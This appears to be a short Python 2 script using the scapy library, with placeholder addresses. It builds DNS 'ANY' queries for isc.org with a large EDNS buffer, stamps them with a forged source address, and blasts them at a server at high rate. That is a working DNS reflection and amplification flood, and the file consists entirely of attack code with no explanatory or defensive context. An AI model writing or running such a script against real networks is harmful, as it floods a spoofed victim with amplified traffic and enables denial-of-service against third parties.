from scapy.all import *
fakesrc = 'x.x.x.x'
server = 'x.x.x.x'
device = 'xxx'

mypacket = IP(dst=server, src=fakesrc)/UDP(sport=RandShort())/DNS(rd=1L, qd=DNSQR(qname="isc.org.", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
l2packet = Ether()/mypacket
sendpfast( l2packet*10000, pps=2500, loop=10, iface=device, file_cache=True )
